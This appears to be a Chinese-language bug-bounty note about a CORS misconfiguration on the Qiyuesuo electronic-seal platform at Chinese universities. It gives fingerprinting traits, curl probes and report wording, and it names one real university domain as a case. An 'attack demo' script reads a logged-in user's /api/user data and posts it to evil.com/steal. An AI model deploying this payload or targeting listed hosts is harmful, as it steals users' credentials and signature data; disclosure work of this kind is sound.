# 契约锁 (qiyuesuo.com) 电子签章平台 CORS漏洞模式

## 触发条件
- 子域: `eseal.*.edu.cn` 或其他部署契约锁平台的域名
- 页面标题含 `专业的电子签约及印章管理平台`
- JS路径: `/qyswebapp/assets/js/`

## 识别特征
- CSP: `script-src *` (极宽松，允许任意脚本源)
- API路径: `/api/user`, `/api/seal`, `/api/auth`
- 所有API端点302到CAS登录
- `access-control-allow-credentials: true`
- Server: rump/e (反代)

## CORS漏洞
所有端点统一反射任意Origin + Credentials=true:
```bash
curl -sk -D- "https://eseal.XXX.edu.cn/" -H "Origin: https://evil.com" | grep -i access-control
# 返回: access-control-allow-origin: https://evil.com
#       access-control-allow-credentials: true

# API端点同样存在
curl -sk -D- "https://eseal.XXX.edu.cn/api/user" -H "Origin: https://evil.com" | grep -i access-control
# 返回: access-control-allow-origin: https://evil.com
#       access-control-allow-credentials: true
```

## 攻击演示
```html
<script>
// 窃取已登录用户的电子签章数据
fetch('https://eseal.XXX.edu.cn/api/user', {credentials: 'include'})
  .then(r => r.json())
  .then(data => {
    // 发送到攻击者服务器
    fetch('https://evil.com/steal', {
      method: 'POST',
      body: JSON.stringify(data)
    });
  });
</script>
```

## 报告角度
"XXX大学电子签章平台存在CORS配置不当漏洞可窃取用户凭证" [高危]

## 注意事项
- 这是契约锁第三方平台的默认配置问题
- API端点需要CAS认证才能访问数据
- 攻击者需要等待已登录用户访问恶意页面
- 需说明是第三方平台配置问题，建议联系契约锁修复

## 实战案例
- 南京林业大学 (eseal.njfu.edu.cn) - 2026-06-01
